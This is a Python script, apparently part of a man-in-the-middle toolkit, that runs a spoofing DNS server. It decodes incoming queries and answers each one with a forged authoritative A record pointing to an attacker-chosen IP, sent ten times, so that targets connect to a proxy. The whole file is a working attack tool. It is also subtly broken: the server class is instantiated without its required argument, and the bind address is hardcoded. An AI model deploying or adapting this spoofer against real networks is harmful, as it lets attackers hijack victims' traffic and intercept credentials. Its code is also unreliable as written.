from dnslib import *
import sys
import argparse
import socket
import binascii
import struct
from datetime import *

class Decode_Packet(object):

	def __init__(self):
		pass

	def transaction_id(self, segment):
		TID = ''
		raw_tid = ''
		tid = struct.unpack("!H", segment)
		for i in tid:
			TID += hex(i)
			raw_tid = i
		return TID, raw_tid

	def flags(self, segment):
		FLAGS = ''
		flags = struct.unpack("!H", segment)
		for i in flags:
			FLAGS += hex(i)
		return FLAGS

	def count(self, segment):
		qdcount = struct.unpack("!H", segment)
		return qdcount

	def type_and_domain(self, segment, pkt):
		idx = 12
		for i in range(segment[0]):
			domain = ""
			subdomain_length = int(pkt[idx])
			while subdomain_length>0:
			    a = idx+1
			    b = a+subdomain_length
			    subdomain = pkt[a:b]
			    if domain=="":
			            domain = subdomain
			    else:
			            domain += b"." + subdomain
			    idx += subdomain_length+1
			    subdomain_length = int(pkt[idx])
			query_type = struct.unpack('!H',pkt[idx+1:idx+3])[0]

			idx += 3

		return (query_type, domain.decode('utf-8'))

class DNS_Server(object):
	"""This class will complete the dns spoof so the target will connect to the proxy server"""
	def __init__(self, local_ip):
		global s, dp
		super(DNS_Server, self).__init__()
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.bind(('192.168.1.115', 53))
		dp = Decode_Packet()

	def decode_packet(self, pkt):
		global domain, raw_tid
		#All returned as a tuple
		trans_id, raw_tid = dp.transaction_id(pkt[:2])
		flags = dp.flags(pkt[2:4])
		questions_count = dp.count(pkt[4:6])
		answer_count = dp.count(pkt[6:8])
		authority_count = dp.count(pkt[8:10])
		additional_count = dp.count(pkt[10:12])
		query_type, domain = dp.type_and_domain(questions_count, pkt)

		return trans_id, flags, questions_count, answer_count, authority_count, additional_count, domain, query_type

	def encode_packet(self, data, spoofed_ip):
		#TODO: Craft packets with raw sockets
		d = DNSRecord(DNSHeader(id=raw_tid, qr=1,aa=1,ra=1),
			q=DNSQuestion(domain),
			a=RR(domain,rdata=A(spoofed_ip)))
		return d.pack()

	def await_responce(self):
		try:
			packet, addr = s.recvfrom(65565)
			packet_d = self.decode_packet(packet)
			return packet_d, addr
		except KeyboardInterrupt: pass

	def send_reply(self, addr, pkt, spoofed_ip):
		packet_e = self.encode_packet(pkt, spoofed_ip)
		for i in range(0, 10):
			s.sendto(packet_e, addr)
		print("[ DNS ]", "[" ,datetime.now(), "]", "[" ,addr[0], "]", domain)
		
if __name__ == '__main__':
	dns = DNS_Server()
	while True:
		raw, addr = dns.await_responce()
		dns.send_reply(addr, raw, sys.argv[1])